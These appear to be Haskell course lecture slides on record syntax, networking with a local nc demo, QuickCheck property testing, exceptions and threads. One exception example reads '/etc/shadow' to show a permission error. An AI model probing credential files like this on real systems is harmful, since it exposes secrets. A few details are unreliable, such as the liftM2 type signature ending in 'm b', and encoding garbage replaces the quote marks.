      setX point x = point { xCoord = x }
      setXY point x y = point { xCoord = x, yCoord = y }

   -  Obviously doesn‚Äôt update destructively, but returns new, modified
      ``Point``

   -  Very handy to maintain state in tail recursive functions and
      ``Monads``

A few Miscellaneous points
==========================

-  A ``!`` before a data field type makes it *strict* - i.e., can‚Äôt be
   thunk

   .. code:: haskell

      data State = State !Int Int

      data AlgState = AlgState { accumulator :: !Int
                               , otherValue :: Int }

   -  In both cases above, the first ``Int`` cannot hold a thunk, but
      only a value

   -  When initializing an algebraic datatype, it is mandatory to
      initialize all strict fields (since they cannot hold the
      ``undefined`` thunk).

.. raw:: html

   <!--
   * [`Data.Map`](http://hackage.haskell.org/packages/archive/containers/latest/doc/html/Data-Map.html) 
   maintains efficient, functional lookup tables
       * The tables cannot be mutated, but can be updated and used in
         recursive functions

   * [`words`](http://hackage.haskell.org/packages/archive/base/latest/doc/html/Data-List.html#v:words)
     breaks a `String` up into a list of whitespace-separated words
   -->

Networking
==========

-  High-level Stream (TCP & Unix-domain) socket support in
   ```Network`` <http://hackage.haskell.org/packages/archive/network/latest/doc/html/Network.html>`__

   .. code:: haskell

      connectTo :: HostName -> PortID -> IO Handle
      listenOn :: PortID -> IO Socket
      accept :: Socket -> (Handle, HostName, PortNumber)
      sClose :: Socket -> IO ()

-  Low-level BSD socket functions in
   ```Network.Socket`` <http://hackage.haskell.org/packages/archive/network/latest/doc/html/Network-Socket.html>`__

   .. code:: haskell

      socket :: Family -> SocketType -> ProtocolNumber -> IO Socket
      connect :: Socket -> SockAddr -> IO ()
      bindSocket :: Socket -> SockAddr -> IO ()
      listen :: Socket -> Int -> IO ()
      accept :: Socket -> IO (Socket, SockAddr)  -- not same accept as above

   -  ```getAddrInfo`` <http://hackage.haskell.org/packages/archive/network/latest/doc/html/Network-Socket.html#v:getAddrInfo>`__
      looks up hostnames just like
      `[RFC3493] <http://tools.ietf.org/html/rfc3493>`__ (returns
      ``[`` ```AddrInfo`` <http://hackage.haskell.org/packages/archive/network/latest/doc/html/Network-Socket.html#t:AddrInfo>`__ ``]``)

   -  We‚Äôll stick to the higher-level functions today

Networking example
==================

-  Instead of ``withTty``, let‚Äôs define ``withClient`` that uses TCP:

   -  To get code: ``wget``
      ```cs240h.stanford.edu/rock2.hs`` <http://cs240h.stanford.edu/rock2.hs>`__

   .. code:: haskell

      withClient :: PortID -> (Handle -> IO a) -> IO a
      withClient listenPort fn = do
        s <- listenOn listenPort
        (h, host, port) <- accept s
        putStrLn $ "Connection from host " ++ host ++ " port " ++ show port
        sClose s  -- Only accept one client
        a <- fn h
        hClose h
        return a

-  Try it like this:

   ::

      *Main> withClient (PortNumber 1617) (computerVsUser Rock)

   ::

      $ nc localhost 1617
      Please enter one of [Rock,Paper,Scissors]
      Rock
      You Tie


/L2 Testing
============

.. container:: slide titlepage

   .. rubric:: Hello, world
      :name: hello-world
      :class: title

.. container:: slide section level1

   I'm Bryan O'Sullivan.

   I work at Facebook.

   Previously, I founded a company that built half its product in
   Haskell.

   I wrote a book about Haskell.

   I've written some Haskell libraries.

.. container:: slide section level1
   :name: lets-talk-about-testing

   .. rubric:: Let's talk about testing

   Have any profs ever talked to you about testing?

.. container:: slide section level1
   :name: testing-in-industry

   .. rubric:: Testing in industry

   There are a few "states of the art" for testing software:

   -  Excel spreadsheet full of stuff to do by hand (I am not making
      this up)

   -  Unit tests

   -  Integration tests

   -  Fuzz tests

.. container:: slide section level1
   :name: what-am-i-interested-in

   .. rubric:: What am I interested in?

   For today, I want to talk about unit tests and their more interesting
   descendants.

   Shamelessly borrowing from Wikipedia:

   .. code:: java

      public class TestAdder {
          public void testSum() {
              Adder adder = new AdderImpl();
              assert(adder.add(1, 1) == 2);
              assert(adder.add(1, 2) == 3);
              assert(adder.add(2, 2) == 4);
              assert(adder.add(0, 0) == 0);
              assert(adder.add(-1, -2) == -3);
              assert(adder.add(-1, 1) == 0);
              assert(adder.add(1234, 988) == 2222);
          }
      }

.. container:: slide section level1
   :name: whats-the-problem

   .. rubric:: What's the problem?

   Count the number of test cases below.

   .. code:: java

      public class TestAdder {
          public void testSum() {
              Adder adder = new AdderImpl();
              assert(adder.add(1, 1) == 2);
              assert(adder.add(1, 2) == 3);
              assert(adder.add(2, 2) == 4);
              assert(adder.add(0, 0) == 0);
              assert(adder.add(-1, -2) == -3);
              assert(adder.add(-1, 1) == 0);
              assert(adder.add(1234, 988) == 2222);
          }
      }

   Okay, don't. It's 7.

.. container:: slide section level1
   :name: the-limits-of-unit-tests

   .. rubric:: The limits of unit tests

   Unit tests are only useful up to a point.

   .. image:: pictures\patience_creativity.svg

   Your patience and ability to think up nasty corner cases are VERY
   finite.

   Best to use them wisely.

   But how?

.. container:: slide section level1
   :name: outsourcing

   .. rubric:: Outsourcing

   For patience, we have computers.

   For nasty corner cases, we have random number generators.

   Let's put them to use.

.. container:: slide section level1
   :name: a-simple-example-utf-16-encoding

   .. rubric:: A simple example: UTF-16 encoding

   UTF-16 is a Unicode encoding that:

   -  takes a *code point* (a Unicode character)

   -  turns it into 1 or 2 16-bit *code units*

   Variable length encoding:

   -  code points below 0x10000 are encoded as a single code unit

   -  at and above 0x10000, two code units

.. container:: slide section level1
   :name: encoding-a-single-code-point

   .. rubric:: Encoding a single code point

   We know that ``Char`` represents a Unicode code point.

   The ``Word16`` type represents a 16-bit value.

   .. code:: haskell

      import Data.Word (Word16)

   What should the type signature of ``encodeChar`` be?

   .. code:: haskell

      encodeChar :: ???

.. container:: slide section level1
   :name: the-base-case-is-easy

   .. rubric:: The base case is easy

   We can easily turn the single-code-unit case into some Haskell using
   a few handy functions.

   .. code:: haskell

      import Data.Char (ord)

      ord :: Char -> Int

      fromIntegral :: (Integral a, Num b) => a -> b

   We use ``fromIntegral`` to convert from ``Int`` to ``Word16`` because
   Haskell will not explicitly coerce for us.

   .. code:: haskell

      encodeChar :: Char -> [Word16]
      encodeChar x
        | w < 0x10000 = [fromIntegral w]
        where w = ord x

.. container:: slide section level1
   :name: the-two-code-unit-case

   .. rubric:: The two-code-unit case

   To encode code points above 0x10000, we need some new bit-banging
   functions.

   .. code:: haskell

      import Data.Bits ((.&.), shiftR)

   The ``.&.`` operator gives us bitwise *and*, while ``shiftR`` is a
   right shift.

   .. code:: haskell

      encodeChar :: Char -> [Word16]
      encodeChar x
        | w < 0x10000 = [fromIntegral w]
        | otherwise   = [fromIntegral a, fromIntegral b]
        where w = ord x
              a = ((w - 0x10000) `shiftR` 10) + 0xD800
              b = (w .&. 0x3FF) + 0xDC00

.. container:: slide section level1
   :name: basic-testing

   .. rubric:: Basic testing

   If you want unit tests, ``HUnit`` is the package you need.

   .. code:: haskell

      import Test.HUnit (assertEqual)

      testASCII =
        assertEqual "ASCII encodes as one code unit"
          1 (length (encodeChar 'a'))

.. container:: slide section level1
   :name: a-bad-test

   .. rubric:: A bad test

   Let's intentionally write a bogus test.

   .. code:: haskell

      badTest = do
        assertEqual "sestertius encodes as one code unit"
          1 (length (encodeChar '\x10198'))

   If we run this in ``ghci``:

   ::

      ghci> badTest
      *** Exception: HUnitFailure "sestertius encodes as one code unit\nexpected: 1\n but got: 2"

   Not pretty, but it works.

.. container:: slide section level1
   :name: but-wait-unit-tests

   .. rubric:: But wait: unit tests?

   So I just slammed unit tests and now I'm showing you how to write
   them?

   Well, we can generalize past the limits of unit tests.

.. container:: slide section level1
   :name: a-proxy-for-a-bigger-picture

   .. rubric:: A proxy for a bigger picture

   What do we really want with this test?

   .. code:: haskell

      testASCII = do
        assertEqual "ASCII encodes as one code unit"
          1 (length (encodeChar 'a'))

   We are really asserting that *every* ASCII code point encodes as a
   single code unit.

   .. code:: haskell

      testOne char = do
        assertEqual "ASCII encodes as one code unit"
          1 (length (encodeChar char))

.. container:: slide section level1
   :name: hmm-better

   .. rubric:: Hmm: better?

   What if we parameterize our test:

   .. code:: haskell

      testOne char = do
        assertEqual "ASCII encodes as one code unit"
          1 (length (encodeChar char))

   And drive it from a harness:

   .. code:: haskell

      testASCII = mapM_ testOne ['\0'..'\127']

.. container:: slide section level1
   :name: taking-stock

   .. rubric:: Taking stock

   This is better, in that our original test is generalized.

   It's also worse, because we're exhaustively enumerating every single
   test input.

   We get away with it here because Unicode is small, and computers are
   fast.

   But it's the *principle* of the thing: automate better!

.. container:: slide section level1
   :name: enter-quickcheck

   .. rubric:: Enter QuickCheck

   Forget about ``HUnit``, here's the package we'll focus on.

   .. code:: haskell

      import Test.QuickCheck

      prop_encodeOne c = length (encodeChar c) == 1

   In ``ghci``:

   ::

      ghci> quickCheck prop_encodeOne
      +++ OK, passed 100 tests.

.. container:: slide section level1
   :name: what-just-happened

   .. rubric:: What just happened?

   Why did ``quickCheck`` say this:

   ::

      +++ OK, passed 100 tests.

   It did the following:

   -  *generated* 100 random values for us

   -  fed each one to ``prop_encodeOne``

   -  ensured that each test passed

.. container:: slide section level1
   :name: now-i-have-a-headache

   .. rubric:: Now I have a headache

   Let's look back at our "test function":

   .. code:: haskell

      prop_encodeOne c = length (encodeChar c) == 1

   This is *very suspicious*.

   We know that ``encodeChar`` sometimes produces lists of length 2.

   So why did our 100 tests pass?

.. container:: slide section level1
   :name: starting-small

   .. rubric:: Starting small

   For most types, QuickCheck operates from the handy assumption that
   "small" test cases are more useful than big ones.

   As tests pass for small random inputs, it generates "bigger" ones.

   With just 100 tests, we are simply not likely to generate a code
   point that encodes as two code units.

.. container:: slide section level1
   :name: behind-the-scenes-generating-values

   .. rubric:: Behind the scenes: generating values

   How does QuickCheck do its thing, anyway?

   It needs to be able to generate random values.

   This it achieves via typeclasses.

   .. code:: haskell

      -- Generator type.
      data Gen a

      -- The set of types for which we
      -- can produce random values.
      class Arbitrary a where
          arbitrary :: Gen a

.. container:: slide section level1
   :name: behind-the-scenes-some-machinery

   .. rubric:: Behind the scenes: some machinery

   .. code:: haskell

      -- Generate a random value within a range.
      choose :: Random a => (a,a) -> Gen a
      instance Arbitrary Bool where
          arbitrary = choose (False,True)

      instance Arbitrary Char {- ... -}

.. container:: slide section level1
   :name: behind-the-scenes-testable-things

   .. rubric:: Behind the scenes: testable things

   .. code:: haskell

      -- Simply protection for a Gen.
      data Property = MkProperty (Gen a)

      -- The set of types that can be tested.
      class Testable prop

      -- The instance bodies are not interesting.
      instance Testable Bool

      instance (Arbitrary a, Show a, Testable prop)
          => Testable (a -> prop)

   The two instances above are crucial.

.. container:: slide section level1
   :name: how-does-this-work

   .. rubric:: How does this work?

   Let's write our test function with a type signature.

   .. code:: haskell

      prop_encodeOne :: Char -> Bool
      prop_encodeOne c = length (encodeChar c) == 1

   And ``quickCheck``:

   .. code:: haskell

      quickCheck :: Testable prop => prop -> IO ()

.. container:: slide section level1
   :name: look-again

   .. rubric:: Look again

   If ``quickCheck`` accepts ``prop_encodeOne``, then the latter must be
   an instance of ``Testable``.

   .. code:: haskell

      prop_encodeOne :: Char -> Bool

      quickCheck :: Testable prop => prop -> IO ()

   But how? Via these two instances.

   .. code:: haskell

      -- Satisfied by the result type
      instance Testable Bool

      -- Satisfied by the argument and result
      instance (Arbitrary a, Show a, Testable prop)
          => Testable (a -> prop)

.. container:: slide section level1
   :name: long-story-short

   .. rubric:: Long story short

   If we pass ``quickCheck`` a function, then:

   -  provided its arguments are all instances of ``Arbitrary`` and
      ``Show``

   -  *and* provided its result is an instance of ``Testable``

   *then* ``quickCheck`` can:

   -  *generate* arbitrary values of *all* necessary types
      automatically,

   -  run our test on those values,

   -  and ensure that our test always passes

.. container:: slide section level1
   :name: so-what

   .. rubric:: So what?

   We still have a broken test!

   ``quickCheck`` tells us that it always passes---when it shouldn't!

   Why? We have to read the source.

   .. code:: haskell

      module Test.QuickCheck.Arbitrary where

      instance Arbitrary Char where
        arbitrary = chr `fmap` oneof [choose (0,127),
                                      choose (0,255)]

   Oh great, QuickCheck will only generate 8-bit characters.

   Our assumption that it would eventually generate big-enough inputs
   was wrong for ``Char``.

   Therefore our test can never fail.

   How...unfortunate!

.. container:: slide section level1
   :name: writing-a-new-arbitrary-instance

   .. rubric:: Writing a new Arbitrary instance

   So now we face a challenge.

   We want a type that is almost exactly like ``Char``, but that has a
   different ``Arbitrary`` instance.

   To create such a type, we use the ``newtype`` keyword.

   .. code:: haskell

      newtype BigChar = Big Char
                      deriving (Eq, Show)

   The type is named ``BigChar``; its constructor is named ``Big``.

   We use ``deriving`` to reuse the ``Eq`` instance of the underlying
   ``Char`` type, and to generate a new ``Show`` instance.

.. container:: slide section level1
   :name: what-next

   .. rubric:: What next?

   We want to be able to flesh this out:

   .. code:: haskell

      instance Arbitrary BigChar where
          arbitrary = {- ... what? ... -}

   The highest Unicode code point is 0x10FFFF.

   We want to generate values in this range.

   We saw this earlier:

   .. code:: haskell

      -- Generate a random value within a range.
      choose :: Random a => (a,a) -> Gen a

.. container:: slide section level1
   :name: random-values-the-hard-way

   .. rubric:: Random values: the hard way

   In order to use ``choose``, we must make ``BigChar`` an instance of
   ``Random``.

   Here's a verbose way to do it:

   .. code:: haskell

      import Control.Arrow (first)
      import System.Random

      instance Random BigChar where
        random                = first Big `fmap` random
        randomR (Big a,Big b) = first Big `fmap` randomR (a,b)

.. container:: slide section level1
   :name: random-values-easier

   .. rubric:: Random values: easier

   If we want to avoid the boilerplate code from the previous slide, we
   can use a trick:

   -  The ``GeneralizedNewtypeDeriving`` language extension

   -  This lets GHC automatically derive some non-standard typeclass
      instances for us, e.g. ``Random``

   .. code:: haskell

      {-# LANGUAGE GeneralizedNewtypeDeriving #-}
      import System.Random

      newtype BigChar = Big Char
                      deriving (Eq, Show, Random)

   -  All we did was add ``Random`` to the ``deriving`` clause above.

   -  As the name suggests, this only works with the ``newtype``
      keyword.

.. container:: slide section level1
   :name: our-instance-and-a-rerun

   .. rubric:: Our instance, and a rerun

   An instance with a body:

   .. code:: haskell

      instance Arbitrary BigChar where
          arbitrary = choose (Big '0',Big '\x10FFFF')

   A new test that unwraps a ``BigChar`` value:

   .. code:: haskell

      prop_encodeOne3 (Big c) = length (encodeChar c) == 1

   And let's try it:

   ::

      ghci> quickCheck prop_encodeOne3
      *** Failed! Falsifiable (after 1 test):
      Big '\317537'

   Great! Not only did our broken test fail immediately...

   ...but it gave us a *counterexample*, an input on which our test
   function reproducibly fails!

.. container:: slide section level1
   :name: the-magic-of-quickcheck

   .. rubric:: The magic of QuickCheck

   The beauty here is several-fold:

   -  We write a simple Haskell function that accepts some inputs and
      returns a ``Bool``

   -  QuickCheck generates random test cases for us, and tests our
      function

   -  If a test case fails, it tells us what the inputs were

.. container:: slide section level1
   :name: so-what-1

   .. rubric:: So what?

   Unit test way:

   -  A pile of unit tests that are small variations on a theme

   QuickCheck way:

   -  One property that you expect to hold universally true

   -  Automatically, randomly generated test inputs

   -  Counterexamples that help you pinpoint your bugs

.. container:: slide section level1
   :name: what-else

   .. rubric:: What else?

   There's a problem with random inputs when a test fails:

   -  They're often *big*.

   -  Big things are difficult for humans to deal with.

   -  Big values usually take longer to look through.

   Starting from a random failing input:

   -  We'd like to find the *smallest* input that will cause a test to
      fail.

   QuickCheck calls this *shrinking*.

.. container:: slide section level1
   :name: micro-lab-shrink-a-bigchar

   .. rubric:: Micro-lab: shrink a BigChar

   Grab the following source file:

   ::

      curl -O http://cs240h.cs.stanford.edu/ShrinkChar.hs

   Using ``ghci`` to do some spelunking, work out a body for
   ``shrinkChar``.

   .. code:: haskell

      instance Arbitrary BigChar where
        arbitrary      = choose (Big '0',Big '\x10FFFF')
        shrink (Big c) = map Big (shrinkChar c)

      -- Write a body for this.
      shrinkChar c = undefined

   You have 5 minutes.

.. container:: slide section level1
   :name: generating-vs-filtering-values

   .. rubric:: Generating vs filtering values

   Here are two different approaches to generating test values.

   First, generate them directly (look at line 2):

   .. code:: haskell

      prop_encodeOne2 = do
        c <- choose ('\0', '\xFFFF')
        return $ length (encodeChar c) == 1

   Second, generate any old value, but *filter* such that we get only
   the ones that make sense:

   .. code:: haskell

      -- These two are basically the same, modulo verbosity.

      prop_encodeOne4 (Big c) =
        (c < '\x10000') ==> length (encodeChar c) == 1

      prop_encodeOne5 = do
        Big c <- arbitrary `suchThat` (< Big '\x10000')
        return $ length (encodeChar c) == 1

.. container:: slide section level1
   :name: generating-vs-filtering

   .. rubric:: Generating vs filtering

   It is *usually* more efficient to generate only the values you'll
   need, and do no filtering.

   Sometimes, it's easier to identify good values when you see them (by
   filtering) than to figure out how to generate them.

   If QuickCheck has to generate too many values that fail a
   ``suchThat`` or other filter, it will give up and may not run as many
   tests as you want.

   -  For both efficiency *and* to ensure that QuickCheck can generate
      enough values to test, it's worth trying to generate only good
      values.

.. container:: slide section level1
   :name: mini-lab-more-code

   .. rubric:: Mini-lab: more code!

   Grab the following source code:

   ::

      curl -O http://cs240h.cs.stanford.edu/Utf16.hs

   Write a definition for ``decodeUtf16``:

   .. code:: haskell

      decodeUtf16 :: [Word16] -> [Char]

   Decide on some QuickCheck tests, write them, and run them.

   You have 15 minutes.

.. container:: slide section level1
   :name: sizing-a-test

   .. rubric:: Sizing a test

   Test data generators have an implicit size parameter, hidden inside
   the ``Gen`` type.

   QuickCheck starts by generating small test cases; it increases the
   size as testing progresses.

   The meaning of "size" is specific to the needs of an ``Arbitrary``
   instance.

   -  The ``Arbitrary`` instance for lists interprets it as "the maximum
      length of a list of arbitrary values".

   We can find the current size using the ``sized`` function, and modify
   it locally using ``resize``:

   .. code:: haskell

      sized  :: (Int -> Gen a) -> Gen a
      resize ::  Int -> Gen a  -> Gen a

.. container:: slide section level1
   :name: lifting

   .. rubric:: Lifting

   We're hopefully by now familiar with the ``Functor`` class:

   .. code:: haskell

      class Functor f  where
          fmap :: (a -> b) -> f a -> f b

   This takes a pure function and "lifts" it into the functor ``f``.

   In general, "lifting" takes a concept and transforms it to work in a
   different (sometimes more general) setting.

   For instance, we can define lifting of functions with the ``Monad``
   class too:

   .. code:: haskell

      liftM :: (Monad m) => (a -> b) -> m a -> m b
      liftM f action = do
        b <- action
        return (f b)

.. container:: slide section level1
   :name: fmap-and-liftm

   .. rubric:: fmap and liftM

   Notice the similarities between the type signatures:

   .. code:: haskell

      fmap  :: (Functor f) => (a -> b) -> f a -> f b
      liftM :: (Monad m)   => (a -> b) -> m a -> m b

   All instances of ``Monad`` can possibly be instances of ``Functor``.
   Ideally, they'd be defined in terms of each other:

   .. code:: haskell

      class (Functor m) => Monad m where
          {- blah blah -}

   For historical reasons, the two classes are separate, so we write
   separate instances for them and just reuse the code:

   .. code:: haskell

      instance Monad MyThingy where
          {- whatever -}

      instance Functor MyThingy where
          fmap = liftM

.. container:: slide section level1
   :name: why-the-apparent-digression

   .. rubric:: Why the apparent digression?

   It turns out that lifting pure functions into monads is really
   common.

   So common, in fact, that ``Control.Monad`` defines a bunch of extra
   combinators for us.

   .. code:: haskell

      liftM2 :: (Monad m) => (a -> b -> c) -> m a -> m b -> m b
      liftM2 f act1 act2 = do
        a <- act1
        b <- act2
        return (f a b)

   These combinators go all the way up to ``liftM5``.

   Look familiar? Useful?

.. container:: slide section level1
   :name: a-tighter-arbitrary-instance

   .. rubric:: A tighter Arbitrary instance

   Before:

   .. code:: haskell

      data Point a = Point a a

      instance (Arbitrary a) => Arbitrary (Point a) where
          arbitrary = do
            x <- arbitrary
            y <- arbitrary
            return (Point x y)

   After:

   .. code:: haskell

      import Control.Monad (liftM2)

      instance (Arbitrary a) => Arbitrary (Point a) where
          arbitrary = liftM2 Point arbitrary arbitrary

.. container:: slide section level1
   :name: micro-lab-shrinking-a-point

   .. rubric:: Micro-lab: shrinking a Point

   QuickCheck provides us with machinery to shrink tuples.

   Make use of this machinery to shrink a ``Point``.

   ::

      curl -O http://cs240h.cs.stanford.edu/TestPoint.hs

   Take 3 minutes.

   .. code:: haskell

      import Control.Monad
      import Test.QuickCheck

      data Point a = Point a a
                     deriving (Eq, Show)

      instance (Arbitrary a) => Arbitrary (Point a) where
          arbitrary = liftM2 Point arbitrary arbitrary
          -- TODO: provide a body for shrink
          shrink = undefined

.. container:: slide section level1
   :name: testing-a-recursive-data-type

   .. rubric:: Testing a recursive data type

   Suppose we have a tree type:

   .. code:: haskell

      data Tree a = Node (Tree a) (Tree a)
                  | Leaf a
                    deriving (Show)

   Here's an obvious ``Arbitrary`` instance:

   .. code:: haskell

      instance (Arbitrary a) => Arbitrary (Tree a) where
          arbitrary = oneof [
                        liftM  Leaf arbitrary
                      , liftM2 Node arbitrary arbitrary
                      ]

   The ``oneof`` combinator chooses a generator at random.

   .. code:: haskell

      oneof :: [Gen a] -> Gen a

.. container:: slide section level1
   :name: whats-up-doc

   .. rubric:: What's up, Doc?

   Potential trouble:

   -  This generator may not terminate at all!

   -  It's likely to produce *huge* trees.

   We can use the ``sample`` function to generate and print some
   arbitrary data.

   .. code:: haskell

      sample :: (Show a) => Gen a -> IO ()

   This helps us to explore what's going on.

.. container:: slide section level1
   :name: a-safer-instance

   .. rubric:: A safer instance

   Here's where the sizing mechanism comes to the rescue.

   .. code:: haskell

      instance (Arbitrary a) => Arbitrary (Tree a) where
          arbitrary = sized tree

      tree :: (Arbitrary a) => Int -> Gen (Tree a)
      tree 0 = liftM Leaf arbitrary
      tree n = oneof [
                 liftM  Leaf arbitrary
               , liftM2 Node subtree subtree
               ]
        where subtree = tree (n `div` 2)

.. container:: slide section level1
   :name: where-all-this-is-going

   .. rubric:: Where all this is going

   QuickCheck is pretty great. Take the time to learn to use it.

   It's a little harder to learn to use it well than unit tests, but it
   pays off big time.

   Furthermore:

   -  We really want to see you provide QuickCheck tests with future
      labs and your final projects.

   Enjoy!

/L3 Concurrency
===============

Exceptions
==========

-  We‚Äôve seen a few functions that ‚Äúreturn‚Äù any type

   .. code:: haskell

      undefined :: a
      error :: String -> a

   -  Return type can be arbitrary because function doesn‚Äôt actually
      return

-  These functions throw *language-level* exceptions

   -  To use exceptions directly, import
      ```Control.Exception`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Control-Exception.html>`__
      as follows:

   .. code:: haskell

      import Prelude hiding (catch)  -- not necessary with new GHCs
      import Control.Exception

   -  Older ``Prelude`` s have an old, less general version of
      ``catch`` you should avoid (``hiding`` keyword prevents import of
      specific symbols)

   -  ```Control.Exception`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Control-Exception.html>`__
      gives you access to the following symbols:

   .. code:: haskell

      class (Typeable e, Show e) => Exception e where ...
      throw :: Exception e => e -> a
      throwIO :: Exception e => e -> IO a
      catch   :: Exception e => IO a -> (e -> IO a) -> IO a

Simple example
==============

.. code:: haskell

   {-# LANGUAGE DeriveDataTypeable #-}

   import Prelude hiding (catch)
   import Control.Exception
   import Data.Typeable

   data MyError = MyError String deriving (Show, Typeable)
   instance Exception MyError

   catcher :: IO a -> IO (Maybe a)
   catcher action = fmap Just action `catch` handler
       where handler (MyError msg) = do putStrLn msg; return Nothing

::

   *Main> catcher $ readFile "/dev/null"
   Just ""
   *Main> catcher $ throwIO $ MyError "something bad"
   something bad
   Nothing

-  Need ``DeriveDataTypeable`` language pragma (later lecture)
-  ``handler`` ‚Äôs type cannot be inferred (use constructor or type
   signature)

   -  Constructor pattern ``e@(SomeException _)`` catches all exceptions

Exceptions in pure code
=======================

-  Previous example wrapped ``catcher`` around an IO action

-  Can ``throw`` exceptions in pure code, yet ``catch`` them only in
   ``IO``

   -  This is because evaluation order depends on implementation
   -  Which error is thrown by ``(error "one") + (error "two")``? Can be
      non-deterministic, which is
      `okay <http://research.microsoft.com/en-us/um/people/simonpj/papers/imprecise-exn.htm>`__
      if ``catch`` is restricted to the ``IO`` Monad

-  In ``IO``, use ``throwIO`` (not ``throw``) to make exception
   sequencing precise

   .. code:: haskell

          do x <- throwIO (MyError "one")  -- this exception thrown
             y <- throwIO (MyError "two")  -- this code not reached
             return $ x + y

   -  Generally, use ``throw`` only where you can‚Äôt use ``throwIO``

-  Pure exceptions quite useful for errors & unimplemented code, E.g.:

   .. code:: haskell

      -- Simplified version of functions in standard Prelude:
      error :: String -> a
      error a = throw (ErrorCall a)
      undefined :: a
      undefined =  error "Prelude.undefined"

Exceptions and laziness
=======================

-  Consider the following function

   .. code:: haskell

      pureCatcher :: a -> IO (Maybe a)
      pureCatcher a = (a `seq` return (Just a))
                      `catch` \(SomeException _) -> return Nothing

   ::

      pureCatcher $ 1 + 1
      Just 2
      *Main> pureCatcher $ 1 `div` 0
      Nothing
      *Main> pureCatcher (undefined :: String)
      Nothing

-  What happens if you do this?

   ::

      *Main> pureCatcher (undefined:undefined :: String)

.. _exceptions-and-laziness-1:

Exceptions and laziness
=======================

-  Consider the following function

   .. code:: haskell

      pureCatcher :: a -> IO (Maybe a)
      pureCatcher a = (a `seq` return (Just a))
                      `catch` \(SomeException _) -> return Nothing

   ::

      pureCatcher $ 1 + 1
      Just 2
      *Main> pureCatcher $ 1 `div` 0
      Nothing
      *Main> pureCatcher (undefined :: String)
      Nothing

-  What happens if you do this?

   ::

      *Main> pureCatcher (undefined:undefined :: String)
      Just "*** Exception: Prelude.undefined

.. _exceptions-and-laziness-2:

Exceptions and laziness
=======================

-  Consider the following function

   .. code:: haskell

      pureCatcher :: a -> IO (Maybe a)
      pureCatcher a = (a `seq` return (Just a))
                      `catch` \(SomeException _) -> return Nothing

   ::

      pureCatcher $ 1 + 1
      Just 2
      *Main> pureCatcher $ 1 `div` 0
      Nothing
      *Main> pureCatcher (undefined :: String)
      Nothing

-  What happens if you do this?

   ::

      *Main> pureCatcher (undefined:undefined :: String)
      Just "*** Exception: Prelude.undefined

-  ``catch`` only catches exceptions when thunks actually evaluated!

Exceptions and laziness continued
=================================

-  Evaluating a list does not evaluate the head or tail

   ::

      *Main> seq (undefined:undefined) ()
      ()

   -  Just evaluates the constructor (i.e., ``(:)`` or ``[]``)

-  Exercise: Force evaluation of every element of a list

   -  Write ``seq``-like function with the following signature, that
      evaluates every element of list before evaluating second argument

   .. code:: haskell

      seqList :: [a] -> b -> b

   ::

      *Main> seqList [1, 2, 3] ()
      ()
      *Main> seqList [1, 2, 3, undefined] ()
      *** Exception: Prelude.undefined

Solution
========

.. code:: haskell

   seqList :: [a] -> b -> b
   seqList [] b     = b
   seqList (a:as) b = seq a $ seqList as b

-  Note, there is a function
   ```deepseq`` <http://hackage.haskell.org/package/deepseq-1.3.0.2/docs/Control-DeepSeq.html#v:deepseq>`__
   in library of same name that does this for many common data types

A few more exception functions
==============================

-  ``try`` returns ``Right a`` normally, ``Left e`` if an exception
   occurred

   .. code:: haskell

      try :: Exception e => IO a -> IO (Either e a)

-  ``finally`` and ``onException`` run an clean-up action

   .. code:: haskell

      finally :: IO a -> IO b -> IO a      -- cleanup always
      onException :: IO a -> IO b -> IO a  -- after exception

   -  Result of cleanup action (``b``) is discarded

-  ``catchJust`` catches only exceptions matching a predicate on value

   .. code:: haskell

      catchJust :: Exception e =>
                   (e -> Maybe b) -> IO a -> (b -> IO a) -> IO a

      readFileIfExists f = catchJust p (readFile f) (\_ -> return "")
        where p e = if isDoesNotExistError e then Just e else Nothing

   ::

      *Main> readFileIfExists "/nosuchfile"
      ""
      *Main> readFileIfExists "/etc/shadow"
      *** Exception: /etc/shadow: openFile: permission denied ...

Monadic exceptions
==================

-  Language-level exceptions can be cumbersome for non-``IO`` actions

   -  Non-determinism is annoying
   -  Often want to detect error without assuming the ``IO`` monad
   -  Many monads built on top of ``IO`` also can‚Äôt catch exceptions

-  Often it is better to implement error handling in the Monad

   -  Recall the ``Maybe`` Monad, where can use ``Nothing`` to indicate
      failure

   .. code:: haskell

      instance  Monad Maybe  where
          (Just x) >>= k = k x
          Nothing  >>= _  = Nothing
          return = Just
          fail _ = Nothing

   -  Note ``fail`` method called when bind pattern matches fail in
      ``do`` block

   .. code:: haskell

      *Main> (do 1 <- return 2; return 3) :: Maybe Int
      Nothing

Haskell threads
===============

-  Haskell implements user-level threads in
   ```Control.Concurrent`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Control-Concurrent.html>`__

   -  Threads are lightweight (in both time and space)
   -  Use threads where in other languages would use cheaper constructs
   -  Runtime emulates blocking OS calls in terms of non-blocking ones
   -  Thread-switch can happen any time GC could be invoked

-  ``forkIO`` call creates a new thread:

   .. code:: haskell

      forkIO :: IO () -> IO ThreadId    -- creates a new thread

-  A few other very useful thread functions:

   .. code:: haskell

      throwTo :: Exception e => ThreadId -> e -> IO ()
      killThread :: ThreadId -> IO ()   -- = flip throwTo ThreadKilled
      threadDelay :: Int -> IO ()       -- sleeps for # of ¬µsec
      myThreadId :: IO ThreadId

Example: timeout
================

-  Execute ``IO`` action, or abort after # of ¬µsec

   -  ```System.Timeout`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/System-Timeout.html>`__
      has a slightly better version of this function

.. code:: haskell

   data TimedOut = TimedOut UTCTime deriving (Eq, Show, Typeable)
   instance Exception TimedOut

   timeout :: Int -> IO a -> IO (Maybe a)
   timeout usec action = do
     -- Create unique exception val (for nested timeouts):
     expired <- fmap TimedOut getCurrentTime

     ptid <- myThreadId
     let child = do threadDelay usec
                    throwTo ptid expired
         parent = do ctid <- forkIO child
                     result <- action
                     killThread ctid
                     return $ Just result
     catchJust (\e -> if e == expired then Just e else Nothing) 
               parent
               (\_ -> return Nothing)

.. _mvarsmvar:

MVar
====

-  The
   ```MVar`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Control-Concurrent-MVar.html>`__
   type lets threads communicate via shared variables

   -  An ``MVar t`` is a mutable variable of type ``t`` that is either
      *full* or *empty*

   .. code:: haskell

      newEmptyMVar :: IO (MVar a)  -- create empty MVar
      newMVar :: a -> IO (MVar a)  -- create full MVar given val

      takeMVar :: MVar a -> IO a
      putMVar :: MVar a -> a -> IO ()

